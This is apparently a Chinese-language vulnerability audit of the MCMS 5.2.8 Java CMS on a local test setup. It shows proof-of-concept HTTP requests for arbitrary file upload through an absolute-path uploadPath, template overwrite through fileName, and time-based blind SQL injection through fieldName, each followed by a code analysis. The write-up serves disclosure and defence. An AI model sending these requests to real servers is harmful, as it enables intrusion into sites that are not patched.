MCMS 是 J2EE 系统，完整开源的Java CMS，基于SpringBoot 2架构，前端基于vue、element
ui。为开发者提供上百套免费模板,同时提供适用的插件（文章、商城、微信、论坛、会员、评论、支付、积分、工作流、任务调度等...），一套简单好用的开源系统、一整套优质的开源生态内容体系。

十天前 ，MCMS 更新了新的一版本 5.2.9 提示新版本进行了 SQL 安全方面的优化，所以我们尝试 审计 [MCMS
5.2.8](https://gitee.com/mingSoft/MCMS/archive/refs/tags/5.2.8.zip)

![image-20220927104524-1hg4b3o.png](https://image.3001.net/images/20220930/1664529535_6336b47f220ac766ba8c5.png!small)

## 环境搭建

我们下载好安装包后

  * 利用 idea 打开项目

  * 创建数据库 mcms，导入 `doc/mcms-5.2.8.sql`

  * 修改 `src/main/resources/application-dev.yml`中关于数据库设置参数

  * 运行MSApplication.java main方法

  * 利用账户名:密码 msopen:msopen 登录后台 `<http://localhost:8080/ms/login.do>`

  * 进入后台点击内容管理->静态化菜单 -> 生成主页、生成栏目、生成文章

启动的时候会有一点小 bug 需要在 idea
中配置。![image-20220928110151-1sq5pge.png](https://image.3001.net/images/20220930/1664529536_6336b480250918bbcadb1.png!small)

运行成功后，页面如图所示。

![](https://image.3001.net/images/20220930/1664529406_6336b3feb0e2fbc225a08.png!small)

## 前台反射型 XSS

###
漏洞复现![image-20220927124814-9z2q2i7.png](https://image.3001.net/images/20220930/1664529537_6336b4815a9fce5942f24.png!small)

![image-20220927114836-kaxyt7t.png](https://image.3001.net/images/20220930/1664529538_6336b48211ab1a8be11e8.png!small)

![image-20220927114907-w1eijnt.png](https://image.3001.net/images/20220930/1664529539_6336b4831f83ea61102cb.png!small)

### 漏洞分析

我们看到运行后的控制台输出为。

![image-20220928105231-n0n35r8.png](https://image.3001.net/images/20220930/1664529540_6336b4844ffcf6f6ec73d.png!small)

我们找到
`net.mingsoft.basic.filter.XssHttpServletRequestWrapper`并添加断点，再次触发漏洞，看到一个完整的调用栈，

`net.mingsoft.basic.filter.XssHttpServletRequestWrapper#clean(java.lang.String,
java.lang.String)`

![image-20220928105759-11yv63j.png](https://image.3001.net/images/20220930/1664529541_6336b48577b22358a6426.png!small)

## ‍后台命令执行一

### 漏洞复现

后台有一个可以上传模板文件的位置。

![image-20220928142757-8okay5r.png](https://image.3001.net/images/20220930/1664529553_6336b49180d0ae4c13645.png!small)

我们上传文件并抓取数据包。

![image-20220928142952-n9m7tm3.png](https://image.3001.net/images/20220930/1664529554_6336b4926c5adc719e34d.png!small)

‍我们看到数据包中的参数 `uploadPath`指定了上传的位置，最后返回了上传后的路径以及文件内容。

![image-20220928143119-bsb0xgu.png](https://image.3001.net/images/20220930/1664529555_6336b493b4b47bf10816e.png!small)

通过修改 参数 `uploadPath`的值，我们就可以将文件上传 `webapp`的任意目录下。

我们写一个 1.txt 进行验证

    
    
    POST /ms/file/uploadTemplate.do HTTP/1.1  
    Host: localhost:8080  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36  
    Content-Length: 506  
    Accept: */*  
    Accept-Encoding: identity  
    Accept-Language: zh-CN,zh;q=0.9  
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz3nUf5Hws24R3B3A  
    Cookie:   
    Origin: http://localhost:8080  
    Referer: http://localhost:8080/ms/template/list.do?template=1/default  
    Sec-Fetch-Dest: empty  
    Sec-Fetch-Mode: cors  
    Sec-Fetch-Site: same-origin  
    sec-ch-ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"  
    sec-ch-ua-mobile: ?0  
    sec-ch-ua-platform: "Windows"  
    ​  
    ------WebKitFormBoundaryz3nUf5Hws24R3B3A  
    Content-Disposition: form-data; name="uploadPath"  
    ​  
    /  
    ------WebKitFormBoundaryz3nUf5Hws24R3B3A  
    Content-Disposition: form-data; name="uploadFloderPath"  
    ​  
    true  
    ------WebKitFormBoundaryz3nUf5Hws24R3B3A  
    Content-Disposition: form-data; name="rename"  
    ​  
    false  
    ------WebKitFormBoundaryz3nUf5Hws24R3B3A  
    Content-Disposition: form-data; name="file"; filename="1.txt"  
    Content-Type: text/html  
    ​  
    test  
    ------WebKitFormBoundaryz3nUf5Hws24R3B3A--
![image-20220928145141-c9yfpgf.png](https://image.3001.net/images/20220930/1664529557_6336b4951b661f45c22f1.png!small)

![image-20220928145205-whxmf2l.png](https://image.3001.net/images/20220930/1664529558_6336b4965d3c107a1ef28.png!small)

### 漏洞分析

通过路由 `/ms/file/uploadTemplate`定位到代码位置

`net.mingsoft.basic.action.ManageFileAction#uploadTemplate`

![image-20220928160122-jtvvscv.png](https://image.3001.net/images/20220930/1664529559_6336b4971e71e975ed576.png!small)​

我们看到虽然存在非法路径过滤函数，查看函数内容，仅仅是对 `../`进行了校验，通过绝对路径仍然可以绕过

`net.mingsoft.basic.action.ManageFileAction#checkUploadPath`

![image-20220928160447-oysdbe4.png](https://image.3001.net/images/20220930/1664529560_6336b49879584fef832b1.png!small)

`net.mingsoft.basic.action.BaseFileAction#uploadTemplate`

![image-20220928165412-vdv3adh.png](https://image.3001.net/images/20220930/1664529561_6336b499612006c5ab318.png!small)

## 后台命令执行二

### 漏洞复现

我们看到除了上传模板的接口，还存在编辑模板的接口。

![image-20220928160841-vm8m761.png](https://image.3001.net/images/20220930/1664529562_6336b49ab92d2a3d9db0e.png!small)

点击编辑，编辑后保存并抓取数据包。

原本的数据包，

![image-20220928161403-auwiag5.png](https://image.3001.net/images/20220930/1664529563_6336b49bb40dde7e7dd99.png!small)

我们看到参数 `fileName`通过绝对路径指定了文件名，所以我们可以通过修改 `fileName`来实现绝对路径写入。

![image-20220928161204-cdn09ld.png](https://image.3001.net/images/20220930/1664529565_6336b49d55a8960886f3b.png!small)

![image-20220928161235-2wyfscl.png](https://image.3001.net/images/20220930/1664529566_6336b49e73f8909d1913e.png!small)

### 漏洞分析

`net.mingsoft.basic.action.TemplateAction#writeFileContent`

![image-20220928162129-twnepqj.png](https://image.3001.net/images/20220930/1664529567_6336b49f48b2c8228b159.png!small)

我们看到对文件的后缀名进行了检验，但还是通过传入的参数 fileName 写入文件。

## ‍后台命令执行三

### 漏洞复现

构造数据包

    
    
    POST /ms/file/upload.do HTTP/1.1  
    Host: localhost:8080  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36  
    Content-Length: 506  
    Accept: */*  
    Accept-Encoding: identity  
    Accept-Language: zh-CN,zh;q=0.9  
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz3nUf5Hws24R3B3A  
    Cookie:   
    Origin: http://localhost:8080  
    Referer: http://localhost:8080/ms/template/list.do?template=1/default  
    Sec-Fetch-Dest: empty  
    Sec-Fetch-Mode: cors  
    Sec-Fetch-Site: same-origin  
    sec-ch-ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"  
    sec-ch-ua-mobile: ?0  
    sec-ch-ua-platform: "Windows"  
    ​  
    ------WebKitFormBoundaryz3nUf5Hws24R3B3A  
    Content-Disposition: form-data; name="uploadPath"  
    ​  
    /  
    ------WebKitFormBoundaryz3nUf5Hws24R3B3A  
    Content-Disposition: form-data; name="uploadFloderPath"  
    ​  
    true  
    ​  
    ------WebKitFormBoundaryz3nUf5Hws24R3B3A  
    Content-Disposition: form-data; name="rename"  
    ​  
    false  
    ​  
    ------WebKitFormBoundaryz3nUf5Hws24R3B3A  
    Content-Disposition: form-data; name="file"; filename="3.txt"  
    Content-Type: text/html  
    ​  
    test  
    ------WebKitFormBoundaryz3nUf5Hws24R3B3A--  
    ​

返回上传成功的文件的地址，

![image-20220928165615-paqrmzk.png](https://image.3001.net/images/20220930/1664529568_6336b4a0eaad0e18f1997.png!small)

### ‍漏洞分析

这个漏洞是在第一个后台命令执行的基础上发现的，两个类位于同一个文件内

`net.mingsoft.basic.action.ManageFileAction#upload`

![image-20220928165037-8eoeckm.png](https://image.3001.net/images/20220930/1664529570_6336b4a222a2c4f02dece.png!small)

虽然存在非法路径过滤函数 `checkUploadPath`，查看函数内容，仅仅是对 `../`进行了校验，通过绝对路径仍然可以绕过。

对文件的上传是利用了

`net.mingsoft.basic.action.BaseFileAction#upload`

![image-20220928165157-yo8xc71.png](https://image.3001.net/images/20220930/1664529571_6336b4a3961cf2b69b483.png!small)

存在很多过滤，但是还是可以成功上传文件。

## ‍后台 SQL 注入漏洞

### ‍漏洞复现

构造数据包

    
    
    GET /ms/mdiy/page/verify.do?fieldName=1;select/**/if(substring((select/**/database()),1,4)='mcms',sleep(5),1)/**/and/**/1&fieldValue=1&id=1&idName=1 HTTP/1.1  
    Host: localhost:8080  
    Accept: application/json, text/plain, */*  
    Accept-Encoding: gzip, deflate, br  
    Accept-Language: zh-CN,zh;q=0.9  
    Cache-Control: no-cache  
    Cookie:  
    Pragma: no-cache  
    Referer: http://localhost:8080/ms/model/index.do?  
    Sec-Fetch-Dest: empty  
    Sec-Fetch-Mode: cors  
    Sec-Fetch-Site: same-origin  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36  
    X-Requested-With: XMLHttpRequest  
    sec-ch-ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"  
    sec-ch-ua-mobile: ?0  
    sec-ch-ua-platform: "Windows"  
    token: null

![image-20220928170542-7dnbxco.png](https://image.3001.net/images/20220930/1664529573_6336b4a51f01501de2475.png!small)

发现成功使得服务器沉睡五秒。

### 漏洞分析

`net.mingsoft.mdiy.action.PageAction#verify`

![image-20220928170820-sdfbxhj.png](https://image.3001.net/images/20220930/1664529574_6336b4a6a56b20e2e8e9c.png!small)

获取参数并传到方法 `validated`

`net.mingsoft.basic.action.BaseAction#validated(java.lang.String,
java.lang.String, java.lang.String)`

![image-20220928170930-u4fodj8.png](https://image.3001.net/images/20220930/1664529575_6336b4a7b473dc78ef94d.png!small)

将 `fieldName`和 `fieldValue`的传入到 where 参数中

`net.mingsoft.base.biz.impl.BaseBizImpl#queryBySQL(java.lang.String,
java.util.List, java.util.Map)`

![image-20220928172007-argi62z.png](https://image.3001.net/images/20220930/1664529576_6336b4a8918659addbe0c.png!small)

​

`net.mingsoft.base.dao.IBaseDao#queryBySQL`

![image-20220928171609-c9f4mpn.png](https://image.3001.net/images/20220930/1664529577_6336b4a9b9c82d68e7916.png!small)

因为是 mybits 所以未采用预编译的 `${`就容易产生注入。

![image-20220928171341-tqn8buu.png](https://image.3001.net/images/20220930/1664529578_6336b4aabb874e668207e.png!small)

## ‍后台 SQL 注入二

### 漏洞复现

登录后台后我们找到自定义模型的位置，

![image-20220929101857-lemvzme.png](https://image.3001.net/images/20220930/1664529579_6336b4abf3283c64de634.png!small)

根据代码生成器 生成一个自定义模型 json 并导入保存。

点击删除时 抓取数据包，

![image-20220929102027-2q0n4ko.png](https://image.3001.net/images/20220930/1664529587_6336b4b3480d18c63f1c5.png!small)

修改`modelTableName`

![image-20220929102232-uz0al4y.png](https://image.3001.net/images/20220930/1664529590_6336b4b656559562c6dc3.png!small)

发现成功使得服务器沉睡五秒。

### 漏洞分析

`net.mingsoft.mdiy.action.ModelAction#delete`

![image-20220929102320-wcncq1y.png](https://image.3001.net/images/20220930/1664529591_6336b4b777792da40272b.png!small)

`net.mingsoft.base.biz.impl.BaseBizImpl#dropTable`

![image-20220929102848-8m520jm.png](https://image.3001.net/images/20220930/1664529592_6336b4b8b11832ed2536d.png!small)

​

`net.mingsoft.base.dao.IBaseDao`

![image-20220929102914-2l9ieiy.png](https://image.3001.net/images/20220930/1664529593_6336b4b98079d391e0169.png!small)

‍

![image-20220929102818-888xgr8.png](https://image.3001.net/images/20220930/1664529594_6336b4ba96628e144f82f.png!small)

查看dropTable对应的mapper内容如下，直接将table内容进行拼接且未预编译，造成SQL注入。

